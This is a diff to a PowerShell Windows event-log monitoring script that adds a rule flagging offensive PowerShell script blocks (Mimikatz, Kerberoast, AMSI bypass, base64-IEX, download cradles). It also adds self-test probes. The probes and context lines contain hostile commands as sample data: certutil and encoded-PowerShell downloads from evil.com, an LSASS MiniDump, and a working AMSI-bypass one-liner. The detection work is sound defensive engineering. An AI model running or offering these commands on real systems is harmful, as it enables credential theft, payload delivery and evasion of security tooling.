@@ -306,6 +306,7 @@ $RuleAudit = @{
   gpo_or_admin_object_modified = @{ Sub = @('Directory Service Changes'); Need = 'Success' }
   computer_account_abuse      = @{ Sub = @('Computer Account Management'); Need = 'Success' }
   suspicious_process_creation = @{ Sub = @('Process Creation'); Need = 'Success' }
+  powershell_scriptblock      = @{ Sub = @('PowerShell Script Block Logging'); Need = 'Success' }
 }
 
 $SuspiciousServicePath = 'powershell|pwsh|cmd\.exe|wmic|mshta|rundll32|regsvr32|certutil|bitsadmin|net\.exe|-enc\b|/c\s|\\temp\\|\\users\\public\\|\\appdata\\|\\programdata\\|\\windows\\tasks'
@@ -571,6 +572,13 @@ $RuleMeta = @{
     Mitre = 'T1059.001 - Command and Scripting Interpreter: PowerShell / T1003.001 - OS Credential Dumping: LSASS Memory / T1505.003 - Server Software Component: Web Shell'; Category = 'Execution'
     Description = 'A process was created with a suspicious command line: ntdsutil (AD database tool), vssadmin delete/create shadow (shadow copy abuse), reg save of SAM/SYSTEM/SECURITY hives (credential dumping), rundll32 comsvcs.dll MiniDump (LSASS dumping), certutil -urlcache (download/execute), or encoded PowerShell (-enc). Requires "Process Creation" audit + command-line logging registry value ProcessCreationIncludeCmdLine_Enabled.'
     Remediation = 'Investigate the parent process and user context. Enable command-line logging (ProcessCreationIncludeCmdLine_Enabled=1) if not already. Block execution of these tools via AppLocker/WDAC where possible.'
+  }
+  powershell_scriptblock = @{
+    Severity = 'High'; Title = 'PowerShell Script Block Logging - Offensive Content'
+    EventId = '4104'; EventIds = @('4104'); DedupeMinutes = 30
+    Mitre = 'T1059.001 - Command and Scripting Interpreter: PowerShell / T1059.003 - Windows Command Shell'; Category = 'Execution'
+    Description = 'A PowerShell script block was logged containing offensive strings: Invoke-Mimikatz, DumpCreds, Invoke-Kerberoast, FromBase64String+IEX, AmsiUtils, Invoke-Obfuscation, Invoke-Expression with obfuscated payloads, or known malicious patterns. Requires PowerShell Script Block Logging (Module Logging) enabled. Stored script text is truncated for safety.'
+    Remediation = 'Review the full script block in the event log. Check if the host/user is compromised. Ensure Script Block Logging is enabled via GPO: Computer Configuration -> Administrative Templates -> Windows Components -> Windows PowerShell -> Turn on PowerShell Script Block Logging.'
   }
 }
 
@@ -2249,6 +2257,14 @@ function Get-NormalizedEvent($e) {
       $f.tokenElevationType = Get-Field $xml "TokenElevationType"
       $f.logonId            = Get-Field $xml "LogonId"
     }
+    4104 {
+      $f.accountName     = Get-Field $xml "User"
+      $f.subjectUserName = Get-Field $xml "User"
+      $f.scriptBlockText = Get-Field $xml "Message"
+      $f.processId       = Get-Field $xml "ProcessId"
+      $f.hostname        = Get-Field $xml "Computer"
+      $f.contextInfo     = Get-Field $xml "ContextInfo"
+    }
     { $_ -in 4768, 4769 } {
       $f.accountName    = Get-Field $xml "TargetUserName"
       $f.serviceName    = Get-Field $xml "ServiceName"
@@ -2508,6 +2524,47 @@ function Evaluate-Event($e) {
         $ent = "$account|$matchedPattern"
         if (-not (Should-Dedupe 'suspicious_process_creation' $ent)) {
           return New-Alert 'suspicious_process_creation' $desc $null $f (Get-DedupeKey 'suspicious_process_creation' $ent) $evtTime
+        }
+      }
+    }
+
+    4104 {
+      # 4104: PowerShell Script Block Logging - detect offensive script content.
+      # Requires: GPO "Turn on PowerShell Script Block Logging" enabled.
+      # Matches known offensive strings in script block text (truncated for storage).
+      $scriptText = "$($f.scriptBlockText)"
+      if (-not $scriptText) { break }
+
+      $text = $scriptText.ToLower()
+      $isMalicious = $false
+      $matchedPattern = ''
+
+      if ($text -match 'invoke-mimikatz') { $isMalicious = $true; $matchedPattern = 'Invoke-Mimikatz' }
+      elseif ($text -match 'dumpcreds') { $isMalicious = $true; $matchedPattern = 'DumpCreds' }
+      elseif ($text -match 'invoke-kerberoast') { $isMalicious = $true; $matchedPattern = 'Invoke-Kerberoast' }
+      elseif ($text -match 'frombase64string.*iex') { $isMalicious = $true; $matchedPattern = 'FromBase64String + IEX' }
+      elseif ($text -match 'amsiutils') { $isMalicious = $true; $matchedPattern = 'AmsiUtils (AMSI bypass)' }
+      elseif ($text -match 'invoke-obfuscation') { $isMalicious = $true; $matchedPattern = 'Invoke-Obfuscation' }
+      elseif ($text -match 'invoke-expression.*obfuscat') { $isMalicious = $true; $matchedPattern = 'Invoke-Expression with obfuscation' }
+      elseif ($text -match '\bIEX\s*\(.*FromBase64String') { $isMalicious = $true; $matchedPattern = 'IEX(FromBase64String)' }
+      elseif ($text -match 'system\.net\.webclient.*downloadstring') { $isMalicious = $true; $matchedPattern = 'WebClient.DownloadString' }
+      elseif ($text -match 'start-process.*-windowstyle\s*hidden') { $isMalicious = $true; $matchedPattern = 'Start-Process -WindowStyle Hidden' }
+
+      if ($isMalicious) {
+        $account = "$($f.accountName)"
+        $subject = "$($f.subjectUserName)"
+        $hostName = "$($f.hostname)"
+
+        # Skip system accounts
+        if (Test-SystemAccount $subject) { break }
+
+        # Truncate stored script text to 500 chars for safety
+        $storedText = if ($scriptText.Length -gt 500) { $scriptText.Substring(0, 500) + '... [truncated]' } else { $scriptText }
+
+        $desc = "PowerShell script block by `"$subject`" on `"$hostName`" matched offensive pattern: $matchedPattern. Script: $storedText"
+        $ent = "$account|$matchedPattern"
+        if (-not (Should-Dedupe 'powershell_scriptblock' $ent)) {
+          return New-Alert 'powershell_scriptblock' $desc $null $f (Get-DedupeKey 'powershell_scriptblock' $ent) $evtTime
         }
       }
     }
@@ -5344,6 +5401,9 @@ function New-SelfTestProbes {
   $probes += @{ ruleKey = 'suspicious_process_creation'; id = 4688; fields = @{ SubjectUserName = 'jsmith'; NewProcessName = 'C:\\Windows\\System32\\rundll32.exe'; CommandLine = 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 C:\\temp\\lsass.dmp full'; ParentProcessName = 'C:\\Windows\\System32\\cmd.exe'; ProcessId = '1237'; ParentProcessId = '5678' } }
   $probes += @{ ruleKey = 'suspicious_process_creation'; id = 4688; fields = @{ SubjectUserName = 'jsmith'; NewProcessName = 'C:\\Windows\\System32\\certutil.exe'; CommandLine = 'certutil -urlcache -f http://evil.com/payload.exe C:\\temp\\payload.exe'; ParentProcessName = 'C:\\Windows\\System32\\cmd.exe'; ProcessId = '1238'; ParentProcessId = '5678' } }
   $probes += @{ ruleKey = 'suspicious_process_creation'; id = 4688; fields = @{ SubjectUserName = 'jsmith'; NewProcessName = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'; CommandLine = 'powershell -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA'; ParentProcessName = 'C:\\Windows\\System32\\cmd.exe'; ProcessId = '1239'; ParentProcessId = '5678' } }
+  $probes += @{ ruleKey = 'powershell_scriptblock'; id = 4104; fields = @{ User = 'jsmith'; Message = 'Invoke-Mimikatz -DumpCreds'; ProcessId = '1240'; Computer = 'SELFTEST-DC'; ContextInfo = 'Module=Microsoft.PowerShell.Core,User=jsmith' } }
+  $probes += @{ ruleKey = 'powershell_scriptblock'; id = 4104; fields = @{ User = 'jsmith'; Message = '[Convert]::FromBase64String("...") | IEX'; ProcessId = '1241'; Computer = 'SELFTEST-DC'; ContextInfo = 'Module=Microsoft.PowerShell.Core,User=jsmith' } }
+  $probes += @{ ruleKey = 'powershell_scriptblock'; id = 4104; fields = @{ User = 'jsmith'; Message = 'amsiutils: [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'; ProcessId = '1242'; Computer = 'SELFTEST-DC'; ContextInfo = 'Module=Microsoft.PowerShell.Core,User=jsmith' } }
 
   return $probes
 }
@@ -5430,6 +5490,7 @@ $LogSources = @(
   }
   @{ Log = 'System'; Ids = @(7045) }
   @{ Log = 'Microsoft-Windows-Windows Defender/Operational'; Ids = @(5001, 5010, 5012) }
+  @{ Log = 'Microsoft-Windows-PowerShell/Operational'; Ids = @(4104) }
 )
 $MonitoredEventIdCount = (@($LogSources | ForEach-Object { $_.Ids }) | Select-Object -Unique).Count
 
